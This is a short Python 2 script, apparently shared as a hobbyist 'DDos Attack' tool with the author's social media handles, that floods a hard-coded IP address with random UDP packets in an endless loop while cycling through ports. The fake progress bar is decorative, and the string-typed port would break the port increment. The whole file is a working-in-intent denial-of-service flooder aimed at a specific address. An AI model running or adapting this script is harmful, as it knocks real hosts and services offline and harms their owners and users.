import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : HA-MRX"
print "You Tube : https://www.youtube.com/c/HA-MRX"
print "github   : https://github.com/Ha3MrX"
print "Facebook : https://www.facebook.com/muhamad.jabar222"
print
#ip = raw_input("IP Target : ")
#port = input("Port       : ")
ip="45.149.78.21"
port="8080"
os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "

print "[=====               ] 25%"

print "[==========          ] 50%"

print "[===============     ] 75%"

print "[====================] 100%"

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

